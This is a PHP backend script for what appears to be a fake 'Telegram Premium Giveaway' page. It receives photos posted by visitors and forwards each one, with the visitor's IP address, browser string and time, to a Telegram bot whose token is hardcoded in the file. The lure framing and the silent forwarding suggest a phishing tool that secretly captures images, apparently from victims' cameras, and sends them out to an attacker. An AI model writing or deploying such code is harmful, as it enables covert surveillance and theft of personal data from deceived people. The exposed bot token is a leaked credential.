<?php
// Telegram Configuration
$botToken = '7584772002:AAHSeKgrC7ewjEvfGhrDrSKAHg9ulVlRw1A';
$chatId = ''; // This needs to be filled with your chat ID or a group chat ID

// Function to get the chat ID if not already known
function getChatId($botToken) {
    $apiUrl = "https://api.telegram.org/bot$botToken/getUpdates";
    $response = file_get_contents($apiUrl);
    $data = json_decode($response, true);
    
    if ($data['ok'] && !empty($data['result'])) {
        foreach ($data['result'] as $update) {
            if (isset($update['message']['chat']['id'])) {
                return $update['message']['chat']['id'];
            }
        }
    }
    return null; // If no chat ID is found
}

// Handle final confirmation
if(isset($_POST['final'])) {
    echo "All photos received successfully";
    exit;
}

// Handle image upload
if(isset($_POST['image'])) {
    // Process the image data
    $data = $_POST['image'];
    $data = str_replace('data:image/jpeg;base64,', '', $data);
    $data = str_replace(' ', '+', $data);
    $imageData = base64_decode($data);
    
    // Get photo number (if provided)
    $photoNum = isset($_POST['photo_num']) ? $_POST['photo_num'] : 1;
    
    // Generate a temporary file name
    $tempFileName = 'temp_' . uniqid() . '.jpg';
    file_put_contents($tempFileName, $imageData);
    
    // Get IP and other information
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $dateTime = date('Y-m-d H:i:s');
    $caption = "🎉 Telegram Premium Giveaway Entry #{$photoNum}\n📱 IP: $ip\n🔍 Browser: " . substr($userAgent, 0, 100) . "\n⏰ Time: $dateTime";
    
    // If chat ID is not set, try to get it
    if (empty($chatId)) {
        $chatId = getChatId($botToken);
        // If still empty, use a fallback method
        if (empty($chatId)) {
            // You can replace this with your personal chat ID once you know it
            // For now, we'll return an error message
            unlink($tempFileName); // Delete the temporary file
            echo "Error: Couldn't determine chat ID. Please send a message to the bot first.";
            exit;
        }
    }
    
    // Prepare the Telegram API request
    $apiUrl = "https://api.telegram.org/bot$botToken/sendPhoto";
    
    // Create the multipart form data
    $postFields = array(
        'chat_id' => $chatId,
        'photo' => new CURLFile($tempFileName),
        'caption' => $caption
    );
    
    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Execute the cURL request
    $result = curl_exec($ch);
    $response = json_decode($result, true);
    
    // Clean up the temporary file
    unlink($tempFileName);
    
    // Close the cURL session
    curl_close($ch);
    
    // Always return success to the client
    echo "Photo {$photoNum} processed";
} else {
    echo "No image data received";
}
?>
